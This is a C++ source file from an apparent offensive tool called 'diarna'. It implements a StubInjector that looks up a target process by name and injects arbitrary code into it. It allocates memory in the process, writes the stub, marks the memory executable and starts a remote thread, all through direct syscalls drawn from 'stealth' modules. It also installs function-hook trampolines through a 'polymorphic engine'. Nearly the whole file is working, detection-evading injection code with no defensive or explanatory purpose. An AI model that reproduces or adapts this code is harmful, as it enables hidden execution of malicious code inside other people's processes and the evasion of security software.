#include <diarna/compiler_port.hpp>
#include <diarna/exec/stub_injector.hpp>
#include <diarna/stealth/syscalls.hpp>
#include <diarna/stealth/polymorph.hpp>

namespace diarna::exec {

StubInjector& StubInjector::instance() { static StubInjector s; return s; }
StubInjector::StubInjector() {}

uint32_t StubInjector::find_pid(const std::wstring& name) {
    ULONG buf_size = 512 * 1024;
    std::vector<uint8_t> buf(buf_size);
    ULONG ret_len = 0;

    using NtQSI = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    auto NtQuerySystemInformation = reinterpret_cast<NtQSI>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQuerySystemInformation) return 0;

    NTSTATUS st = NtQuerySystemInformation(5, buf.data(), buf_size, &ret_len);
    if (st < 0) return 0;

    auto* spi = reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(buf.data());
    while (spi) {
        if (spi->ImageName.Buffer && _wcsicmp(spi->ImageName.Buffer, name.c_str()) == 0)
            return (uint32_t)(uintptr_t)spi->UniqueProcessId;
        spi = spi->NextEntryOffset ?
            reinterpret_cast<SYSTEM_PROCESS_INFORMATION*>(
                reinterpret_cast<uint8_t*>(spi) + spi->NextEntryOffset) : nullptr;
    }
    return 0;
}

bool StubInjector::inject_into_process(const std::wstring& process_name,
                                        std::span<const uint8_t> stub_code) {
    uint32_t pid = find_pid(process_name);
    if (!pid) return false;

    auto& sys = stealth::DirectSyscalls::instance();

    HANDLE proc = nullptr;
    CLIENT_ID cid = {(HANDLE)(uintptr_t)pid, nullptr};
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    sys.NtOpenProcess(&proc, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, &oa, &cid);
    if (!proc) return false;

    PVOID base = nullptr;
    SIZE_T size = stub_code.size() + 4096;
    sys.NtAllocateVirtualMemory(proc, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    SIZE_T written = 0;
    sys.NtWriteVirtualMemory(proc, base, const_cast<uint8_t*>(stub_code.data()), stub_code.size(), &written);

    SIZE_T psize = size;
    PVOID pbase = base;
    ULONG old_prot = 0;
    sys.NtProtectVirtualMemory(proc, &pbase, &psize, PAGE_EXECUTE_READ, &old_prot);

    HANDLE thread = nullptr;
    sys.NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, nullptr, proc, base, nullptr, 0, 0, 0, 0, nullptr);

    if (thread) sys.NtClose(thread);
    sys.NtClose(proc);

    StubInfo info;
    info.pid = pid;
    info.process_name = process_name;
    info.stub_address = base;
    info.stub_size = stub_code.size();
    info.injected_at = std::chrono::steady_clock::now();

    std::lock_guard lock(mutex_);
    stubs_.push_back(info);
    return true;
}

bool StubInjector::extend_function(void* target_func, void* hook, void** trampoline) {
    auto& poly = stealth::PolymorphicEngine::instance();
    poly.install_trampoline(target_func, hook, trampoline);
    return *trampoline != nullptr;
}

bool StubInjector::remove_all() {
    std::lock_guard lock(mutex_);
    stubs_.clear();
    return true;
}

std::vector<StubInjector::StubInfo> StubInjector::active_stubs() const {
    std::lock_guard lock(mutex_);
    return stubs_;
}

} // namespace diarna::exec
